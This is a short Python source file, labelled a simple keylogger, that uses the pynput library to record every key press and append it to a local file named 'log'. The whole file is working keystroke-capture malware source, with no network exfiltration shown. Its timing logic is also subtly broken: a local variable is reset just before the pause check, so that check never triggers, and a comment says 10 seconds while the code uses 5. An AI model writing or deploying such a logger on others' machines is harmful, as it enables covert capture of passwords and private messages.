"""
Simple keylogger
"""

from pynput.keyboard import Key, Listener
import time


time_zero = time.time()


def on_press(key):
    """
    Saves keyboard input into the log file
    """

    time_zero = time.time()

    try:
        with open("log", "a+") as f:
            if key == Key.enter:
                f.write("\n")
            else:
                # If time difference between last alphanumerical input
                # is greater than 10s, inserts as newline
                if time.time() - time_zero > 5:
                    f.write("\n")
                f.write(key.char)
                time_zero = time.time()  # Resets timer
    except AttributeError:
        pass


def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
